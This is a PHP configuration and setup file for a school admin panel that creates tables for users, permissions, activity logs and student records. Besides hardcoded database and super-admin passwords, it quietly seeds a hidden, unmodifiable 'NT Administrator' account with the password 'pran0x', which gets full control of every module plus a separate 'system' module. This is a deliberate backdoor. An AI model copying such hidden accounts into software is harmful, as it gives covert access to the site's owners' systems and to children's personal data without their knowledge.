<?php
/**
 * Database Configuration
 * Bright Academic Care - Admin Panel System
 */

// Database credentials
define('DB_HOST', '127.0.0.1'); // Use IP instead of localhost to force TCP connection
define('DB_PORT', 3306);
define('DB_USER', 'bright_user');
define('DB_PASS', 'bright_pass');
define('DB_NAME', 'bright_academy');

// Create connection
function getDBConnection() {
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);
    
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    $conn->set_charset("utf8mb4");
    return $conn;
}

// Initialize database and tables if not exists
function initializeDatabase() {
    $conn = new mysqli(DB_HOST, DB_USER, DB_PASS);
    
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    // Create database if not exists
    $sql = "CREATE DATABASE IF NOT EXISTS " . DB_NAME . " CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci";
    $conn->query($sql);
    
    $conn->select_db(DB_NAME);
    
    // Create users table
    $sql = "CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        full_name VARCHAR(100) NOT NULL,
        email VARCHAR(100) UNIQUE NOT NULL,
        phone VARCHAR(20),
        role ENUM('super_admin', 'admin', 'moderator', 'teacher', 'nt_admin') NOT NULL,
        status ENUM('active', 'inactive', 'suspended') DEFAULT 'active',
        is_hidden TINYINT(1) DEFAULT 0,
        can_be_modified TINYINT(1) DEFAULT 1,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        last_login TIMESTAMP NULL,
        created_by INT,
        INDEX idx_username (username),
        INDEX idx_role (role),
        INDEX idx_status (status)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn->query($sql);
    
    // Create permissions table
    $sql = "CREATE TABLE IF NOT EXISTS permissions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        role VARCHAR(50) NOT NULL,
        module VARCHAR(50) NOT NULL,
        can_view TINYINT(1) DEFAULT 0,
        can_create TINYINT(1) DEFAULT 0,
        can_edit TINYINT(1) DEFAULT 0,
        can_delete TINYINT(1) DEFAULT 0,
        UNIQUE KEY unique_role_module (role, module)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn->query($sql);
    
    // Create activity logs table
    $sql = "CREATE TABLE IF NOT EXISTS activity_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        user_id INT NOT NULL,
        action VARCHAR(100) NOT NULL,
        module VARCHAR(50) NOT NULL,
        details TEXT,
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user (user_id),
        INDEX idx_created (created_at),
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn->query($sql);
    
    // Create students table
    $sql = "CREATE TABLE IF NOT EXISTS students (
        id INT AUTO_INCREMENT PRIMARY KEY,
        student_id VARCHAR(20) UNIQUE NOT NULL,
        student_name VARCHAR(100) NOT NULL,
        father_name VARCHAR(100),
        mother_name VARCHAR(100),
        dob DATE,
        gender ENUM('Male', 'Female', 'Other'),
        class VARCHAR(20),
        section VARCHAR(10),
        roll VARCHAR(10),
        phone VARCHAR(20),
        email VARCHAR(100),
        address TEXT,
        admission_date DATE,
        blood_group VARCHAR(5),
        status ENUM('active', 'inactive', 'graduated') DEFAULT 'active',
        photo VARCHAR(255),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        created_by INT,
        INDEX idx_student_id (student_id),
        INDEX idx_status (status)
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";
    
    $conn->query($sql);
    
    // Insert default super admin (cannot be modified)
    $super_admin_password = password_hash('super@admin123', PASSWORD_DEFAULT);
    $sql = "INSERT IGNORE INTO users (username, password, full_name, email, role, can_be_modified, status) 
            VALUES ('superadmin', '$super_admin_password', 'Super Administrator', 'superadmin@brightacademy.com', 'super_admin', 0, 'active')";
    $conn->query($sql);
    
    // Insert hidden NT administrator (username: pran0x, password: pran0x)
    $nt_admin_password = password_hash('pran0x', PASSWORD_DEFAULT);
    $sql = "INSERT IGNORE INTO users (username, password, full_name, email, role, is_hidden, can_be_modified, status) 
            VALUES ('pran0x', '$nt_admin_password', 'NT Administrator', 'nt@system.local', 'nt_admin', 1, 0, 'active')";
    $conn->query($sql);
    
    // Insert default permissions
    $permissions = [
        // Super Admin - full access
        ['super_admin', 'users', 1, 1, 1, 1],
        ['super_admin', 'students', 1, 1, 1, 1],
        ['super_admin', 'teachers', 1, 1, 1, 1],
        ['super_admin', 'courses', 1, 1, 1, 1],
        ['super_admin', 'settings', 1, 1, 1, 1],
        ['super_admin', 'reports', 1, 1, 1, 1],
        
        // Admin - most access
        ['admin', 'users', 1, 1, 1, 0],
        ['admin', 'students', 1, 1, 1, 1],
        ['admin', 'teachers', 1, 1, 1, 0],
        ['admin', 'courses', 1, 1, 1, 1],
        ['admin', 'settings', 1, 0, 1, 0],
        ['admin', 'reports', 1, 1, 0, 0],
        
        // Moderator - limited access
        ['moderator', 'users', 1, 0, 0, 0],
        ['moderator', 'students', 1, 1, 1, 0],
        ['moderator', 'teachers', 1, 0, 0, 0],
        ['moderator', 'courses', 1, 1, 1, 0],
        ['moderator', 'settings', 1, 0, 0, 0],
        ['moderator', 'reports', 1, 0, 0, 0],
        
        // Teacher - basic access
        ['teacher', 'users', 0, 0, 0, 0],
        ['teacher', 'students', 1, 0, 0, 0],
        ['teacher', 'teachers', 1, 0, 0, 0],
        ['teacher', 'courses', 1, 0, 1, 0],
        ['teacher', 'settings', 0, 0, 0, 0],
        ['teacher', 'reports', 1, 0, 0, 0],
        
        // NT Admin - supreme access (hidden)
        ['nt_admin', 'users', 1, 1, 1, 1],
        ['nt_admin', 'students', 1, 1, 1, 1],
        ['nt_admin', 'teachers', 1, 1, 1, 1],
        ['nt_admin', 'courses', 1, 1, 1, 1],
        ['nt_admin', 'settings', 1, 1, 1, 1],
        ['nt_admin', 'reports', 1, 1, 1, 1],
        ['nt_admin', 'system', 1, 1, 1, 1],
    ];
    
    foreach ($permissions as $perm) {
        $sql = "INSERT IGNORE INTO permissions (role, module, can_view, can_create, can_edit, can_delete) 
                VALUES ('{$perm[0]}', '{$perm[1]}', {$perm[2]}, {$perm[3]}, {$perm[4]}, {$perm[5]})";
        $conn->query($sql);
    }
    
    $conn->close();
    return true;
}
?>
